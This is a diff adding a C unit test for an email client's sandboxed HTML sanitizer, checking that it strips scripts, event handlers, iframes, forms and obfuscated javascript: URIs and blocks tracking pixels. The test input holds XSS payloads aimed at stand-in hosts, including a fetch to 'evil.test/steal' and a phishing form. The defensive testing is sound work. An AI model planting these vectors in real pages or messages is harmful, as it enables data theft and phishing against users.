@@ -54,6 +54,53 @@ int main(void) {
     assert(empty != NULL && empty[0] == '\0');
     free(empty);
     printf("ok    malformed-and-empty-html\n");
+
+    /* 3. Sandboxed HTML sanitizer strips XSS vectors, active tags, event handlers,
+     *    obfuscated javascript: URIs, and blocks remote tracking pixels by default */
+    const char *untrusted =
+        "<html><head><meta http-equiv=\"refresh\" content=\"0;url=https://evil.test\">"
+        "<base href=\"https://evil.test/\"></head><body>"
+        "<script>window.fetch('https://evil.test/steal')</script>"
+        "<iframe src=\"https://evil.test/frame\" srcdoc=\"<script>alert(1)</script>\"></iframe>"
+        "<svg onload=\"alert(2)\"><script>alert(3)</script></svg>"
+        "<form action=\"https://evil.test/phish\"><input name=\"pw\"></form>"
+        "<div onclick=\"alert(4)\" style=\"background:url(https://tracker.test/bg.png)\">Hello <b>CDE</b></div>"
+        "<a href=\"java&#x09;script:alert(5)\">Obfuscated JS 1</a>"
+        "<a href=\"&#106avascript:alert(6)\">Obfuscated JS 2</a>"
+        "<a href=\"data:text/html,<script>alert(7)</script>\">Data HTML</a>"
+        "<a href=\"https://ck-core.example/safe\">Safe Link</a>"
+        "<img src=\"https://tracker.test/pixel.gif\" onerror=\"alert(8)\" alt=\"TrackerLogo\">"
+        "<img src=\"data:image/svg+xml;base64,PHN2Zz4=\" alt=\"BadSvg\">"
+        "<img src=\"cid:inline1@mail\" alt=\"InlineImg\">"
+        "</body></html>";
+
+    int blocked = -1;
+    char *san = dtmail_sanitize_html_sandboxed(untrusted, strlen(untrusted), 0, &blocked);
+    assert(san != NULL);
+    assert(blocked == 2); /* 1 CSS url(https://...) + 1 <img src="https://..."> */
+    assert(strstr(san, "Content-Security-Policy") != NULL);
+    assert(strstr(san, "default-src 'none'") != NULL);
+    assert(strstr(san, "<script") == NULL);
+    assert(strstr(san, "<iframe") == NULL);
+    assert(strstr(san, "<svg") == NULL);
+    assert(strstr(san, "<form") == NULL);
+    assert(strstr(san, "<base") == NULL);
+    assert(strstr(san, "http-equiv=\"refresh\"") == NULL);
+    assert(strstr(san, "onclick") == NULL);
+    assert(strstr(san, "onload") == NULL);
+    assert(strstr(san, "onerror") == NULL);
+    assert(strstr(san, "javascript:") == NULL);
+    assert(strstr(san, "data:text/html") == NULL);
+    assert(strstr(san, "image/svg+xml") == NULL);
+    assert(strstr(san, "tracker.test") == NULL);
+    assert(strstr(san, "[Remote image blocked: TrackerLogo]") != NULL);
+    assert(strstr(san, "2 remote image(s)/tracker(s) blocked") != NULL);
+    assert(strstr(san, "href=\"https://ck-core.example/safe\"") != NULL);
+    assert(strstr(san, "rel=\"noopener noreferrer\"") != NULL);
+    assert(strstr(san, "src=\"cid:inline1@mail\"") != NULL);
+    free(san);
+    printf("ok    html-sandbox-csp-and-tracker-blocking\n");
+
     return 0;
 }
 """
